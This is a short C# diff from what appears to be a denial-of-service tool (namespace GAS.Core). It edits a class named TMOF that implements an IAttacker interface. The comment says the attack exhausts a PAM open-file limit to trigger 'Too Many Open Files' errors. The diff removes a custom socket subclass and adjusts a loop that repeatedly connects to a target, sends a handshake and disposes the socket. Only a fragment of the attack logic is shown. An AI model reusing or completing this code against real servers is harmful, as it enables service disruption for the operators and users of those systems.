@@ -7,18 +7,10 @@ using System.Threading;
 namespace GAS.Core
 {
     /// <summary>
-    /// this attack exploits pam opne file limit 
-    /// and causes "Too Many Open Files" erro
+    /// this attack exploits pam open file limit 
+    /// and causes "Too Many Open Files" error
+    /// i'm  not sure it wotks well
     /// </summary>
-    class rSocket : Socket
-    {
-        public rSocket(SocketInformation socketinformation)  : base(socketinformation) { }
-        public rSocket(AddressFamily adressfamily, SocketType sockettype, ProtocolType protocoltype) : base( adressfamily, sockettype, protocoltype) { }
-        public void Dispose(int dispozzz)
-        {
-            this.Dispose(true);
-        }
-    }
     class TMOF:IAttacker
     {
         byte[] handshake = new byte[] { 1, 2, 3 };
@@ -65,7 +57,7 @@ namespace GAS.Core
                         s.Connect(Target, Port);
                         s.Shutdown(SocketShutdown.Receive);
                         s.Send(handshake);
-                        s.Dispose(0);
+                        s.Dispose();
                         csockets--;
                     }
                     catch { }
